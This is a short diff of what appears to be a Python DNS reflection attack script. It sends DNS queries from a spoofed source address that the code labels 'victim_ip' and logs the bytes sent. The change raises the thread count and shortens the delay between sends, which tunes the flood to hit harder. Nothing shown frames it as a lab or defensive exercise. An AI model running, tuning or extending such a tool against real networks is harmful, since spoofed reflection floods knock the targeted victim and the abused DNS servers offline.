@@ -14,9 +14,9 @@ import os
 
 
 # Number of threads to use
-NUM_THREADS = 10
+NUM_THREADS = 40
 # Number of DNS queries to send per thread
-NUM_QUERIES = 100
+NUM_QUERIES = 40
 # The source IP address to use
 SRC_IP = "40.40.10.10"
 # The DNS server to send the queries to
@@ -74,7 +74,7 @@ def send_custom_dns_query(src_ip, dns_server, domain):
         send(dns_request, verbose=0)
         BYTE_COUNTER.add(len(dns_request))
         QUEUE.put({'time': time.time(), 'query_size': len(dns_request), 'victim_ip': src_ip, 'dns_server': dns_server, 'query_domain': domain, 'query_type': QUERY_TYPE})
-        time.sleep(0.3)
+        time.sleep(0.2)
 
     
 # Send NUM_THREADS x NUM_QUERIES DNS queries
